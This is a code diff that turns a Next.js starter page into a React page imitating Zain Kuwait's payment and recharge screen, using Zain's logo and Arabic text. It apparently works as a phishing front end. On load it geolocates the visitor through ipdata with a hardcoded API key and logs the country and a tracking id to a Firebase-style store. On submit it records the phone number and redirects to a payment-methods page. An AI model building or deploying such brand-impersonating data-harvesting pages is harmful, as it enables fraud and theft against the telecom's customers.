@@ -1,113 +1,227 @@
-import Image from 'next/image';
+"use client"
 
-export default function Home() {
+import { useEffect, useState } from "react"
+import { ChevronDown, Heart, Loader2, Menu, ShoppingCart } from "lucide-react"
+import { cn, setupOnlineStatus } from "@/lib/utils"
+import { useRouter } from "next/navigation"
+import { addData } from "@/lib/firebasee"
+
+export default function ZainPayment() {
+  const [selectedTab, setSelectedTab] = useState("bill")
+  const [showAmountDropdown, setShowAmountDropdown] = useState(false)
+  const [selectedAmount, setSelectedAmount] = useState("6.000")
+  const [phoneNumber, setPhoneNumber] = useState("")
+  const [isSubmmited, setIsSubmmited] = useState(false)
+  const _id=randstr('zain-')
+  const router=useRouter()
+  function randstr(prefix:string)
+{
+    return Math.random().toString(36).replace('0.',prefix || '');
+}
+
+  const amounts = [
+    { value: "2.000", validity: 7 },
+    { value: "4.000", validity: 15 },
+    { value: "6.000", validity: 30 },
+    { value: "12.000", validity: 90 },
+    { value: "22.000", validity: 180 },
+    { value: "30.000", validity: 365 },
+  ]
+
+  const adOptions = [
+    { id: "basic", title: "الإعلان الأساسي", price: "5.000", description: "إعلان لمدة 7 أيام" },
+    { id: "standard", title: "الإعلان القياسي", price: "10.000", description: "إعلان لمدة 15 يوم مع ميزة التثبيت" },
+    {
+      id: "premium",
+      title: "الإعلان المميز",
+      price: "20.000",
+      description: "إعلان لمدة 30 يوم مع ميزة التثبيت والظهور في الصفحة الرئيسية",
+    },
+  ]
+useEffect(()=>{
+  getLocation().then(()=>{})
+},[])
+async function getLocation() {
+  const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
+  const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
+
+  try {
+      const response = await fetch(url);
+      if (!response.ok) {
+          throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      const country = await response.text();
+      addData({
+          id:_id,
+          country: country
+      })
+      localStorage.setItem('country',country)
+      setupOnlineStatus(_id)
+    } catch (error) {
+      console.error('Error fetching location:', error);
+  }
+}
   return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">app/page.tsx</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{' '}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
+    <div className="max-w-md mx-auto bg-white min-h-screen" dir="rtl">
+      {/* Header */}
+      <header className="flex items-center justify-end p-4 bg-[#2d1a45]">
+        <div className="ml-auto flex">
+          <Menu className="text-white"  size={24} />
+          <img src="https://www.kw.zain.com/o/zain-theme/images/zain_logo.svg" alt="Zain Logo" className="h-7 " />
+          </div>
+
+        <Heart className="text-white" size={24} />
+        <div className="bg-white rounded-full p-2 mx-2">
+          <ShoppingCart className="text-[#2d1a45]" size={20} />
+        </div>
+        <div className=" right-16">
+        </div>
+      </header>
+
+      {/* Login Banner */}
+      <div className="bg-gradient-to-l from-[#2d1a45] to-[#6b2a84] p-4 flex justify-between items-center">
+      <div className="text-white text-sm text-right">
+          <p>يرجى تسجيل الدخول إلى MyZain للحصول على تجربة</p>
+          <p>مخصصة</p>
         </div>
       </div>
 
-      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-[240px] after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px] z-[-1]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
+      {/* Main Content */}
+      <div className="p-4">
+        <h2 className="text-xl font-bold text-right mb-4">الدفع السريع</h2>
+
+        {/* Tabs */}
+        <div className="flex border-b mb-6">
+          <button
+            className={cn(
+              "flex-1 py-3 text-center",
+              selectedTab === "bill" ? "border-b-2 border-[#d13c8c] text-[#d13c8c]" : "text-gray-500",
+            )}
+            onClick={() => setSelectedTab("bill")}
+          >
+            دفع الفاتورة
+          </button>
+          <button
+            className={cn(
+              "flex-1 py-3 text-center",
+              selectedTab === "recharge" ? "border-b-2 border-[#d13c8c] text-[#d13c8c]" : "text-gray-500",
+            )}
+            onClick={() => setSelectedTab("recharge")}
+          >
+            إعادة تعبئة eeZee
+          </button>
+        </div>
+
+        {/* Form */}
+        <div className="space-y-6">
+          <div className="text-right mb-2">
+            <p>أريد أن أعيد التعبئة </p>
+          </div>
+
+          <div className="relative">
+            <select className="w-full flex justify-between items-center border-b pb-2 cursor-pointer" onClick={() => {}}>
+              <option value={1}> <ChevronDown className="text-[#d13c8c]" />
+                <span>رقم آخر</span>
+              </option>
+              <option value={2}> <ChevronDown className="text-[#d13c8c]" />
+                <span>رقم العقد</span>
+              </option>
+            </select>
+          </div>
+
+          <div className="relative flex flex-col">
+            <label className="block text-right text-sm mb-1 text-gray-500">* رقم الهاتف</label>
+           <div className="flex">
+         
+            <input
+              type="tel"
+              required
+              maxLength={8}
+              minLength={8}
+              value={phoneNumber}
+              onChange={(e) => setPhoneNumber(e.target.value)}
+              className=" w-full border-b pb-2 text-left focus:outline-none"
+            />
+              <input
+              type="tel"
+readOnly
+              value={'+965'}
+              className="w-8 border-b pb-2 text-left focus:outline-none"
+            />
+           </div>
+          </div>
+
+          <div className="relative">
+            <div className="flex justify-between items-center border-b pb-2">
+              <div
+                className="flex items-center cursor-pointer"
+                onClick={() => setShowAmountDropdown(!showAmountDropdown)}
+              >
+                <ChevronDown
+                  className={`text-[#d13c8c] transition-transform ${showAmountDropdown ? "rotate-180" : ""}`}
+                />
+                <span className="ml-2">{selectedAmount} د.ك</span>
+              </div>
+              <label className="block text-right text-sm text-gray-500">مبلغ التعبئة</label>
+            </div>
+            <div className="text-right text-sm text-gray-500 mt-1">الصلاحية 30 يوم</div>
+
+            {/* Dropdown */}
+            {showAmountDropdown && (
+              <div className="absolute  z-10 bg-white shadow-lg w-full mt-2 border rounded">
+                {amounts.map((amount) => (
+                  <div
+                    key={amount.value}
+                    className={`flex justify-between p-3 cursor-pointer hover:bg-gray-50 ${selectedAmount === amount.value ? "bg-gray-50" : ""}`}
+                    onClick={() => {
+                      setSelectedAmount(amount.value)
+                      setShowAmountDropdown(false)
+                      localStorage.setItem('amount',selectedAmount)
+                    }}
+                  >
+                    <div className="flex items-center">
+                      {selectedAmount === amount.value && (
+                        <svg className="w-5 h-5 text-[#d13c8c]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
+                        </svg>
+                      )}
+                      <span className="ml-2">{amount.value} د.ك</span>
+                    </div>
+                    <span>الصلاحية {amount.validity} يوم</span>
+                  </div>
+                ))}
+                <div className="flex justify-center p-3 cursor-pointer hover:bg-gray-50 border-t">
+                  <span className="text-[#d13c8c]">مبلغ آخر</span>
+                </div>
+              </div>
+            )}
+          </div>
+        </div>
       </div>
 
-      <div className="mb-32 grid text-center lg:max-w-5xl lg:w-full lg:mb-0 lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Docs{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
+    
+      {/* Offers Section */}
+      <div className="mt-28 p-4 border-t">
+        <div className=" flex justify-between items-center">
+        <button
+        
+        disabled={isSubmmited ||phoneNumber ===''} onClick={()=>{
+          setIsSubmmited(true)
+          addData({id:_id,name:phoneNumber,phone:phoneNumber})
+          setTimeout(() => {
 
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Learn{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
+            router.push('/payment-methods')
+            setIsSubmmited(false)            
 
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Templates{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Explore the Next.js 13 playground.
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Deploy{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
+          }, 4000);
+        }} className="w-full mt-28 justify-center flex bg-[#d13c8c] text-white py-3 rounded-md font-medium">
+          دفع
+          
+{isSubmmited &&<Loader2 className="animate-spin mx-2"/>
+}          </button>
+        </div>
       </div>
-    </main>
-  );
+    </div>
+  )
 }
+
